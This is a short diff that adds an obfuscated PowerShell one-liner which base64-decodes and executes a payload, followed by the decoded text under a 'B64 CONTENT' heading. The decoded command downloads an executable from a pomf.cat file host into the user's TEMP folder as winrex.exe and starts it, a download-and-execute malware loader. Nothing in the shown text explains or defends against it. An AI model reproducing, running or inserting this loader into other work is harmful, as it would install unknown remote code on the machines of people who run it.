@@ -1,0 +1,7 @@
+iex([syStEm.TEXt.EncoDiNG]::uTF8.getstRInG([SystEm.convERT]::FRoMbAse64StRiNG('CihOZXctT2JqZWN0IFN5U3RFbS5uRVQuV2ViQ0xpZU50KS5Eb1dOTE9BZEZJTEUoJ2h0dHBzOi8vYS5wb21mLmNhdC92aGN3Ym8uZXhlJywiJGVudjpURU1QXHdpbnJleC5leGUiKTtTdGFydC1Qcm9jZXNzICgiJGVudjpURU1QXHdpbnJleC5leGUiKQoK')));exit
+
+##### B64 CONTENT #####
+
+
+(New-Object SyStEm.nET.WebCLieNt).DoWNLOAdFILE('https://a.pomf.cat/vhcwbo.exe',"$env:TEMP\winrex.exe");Start-Process ("$env:TEMP\winrex.exe")
+
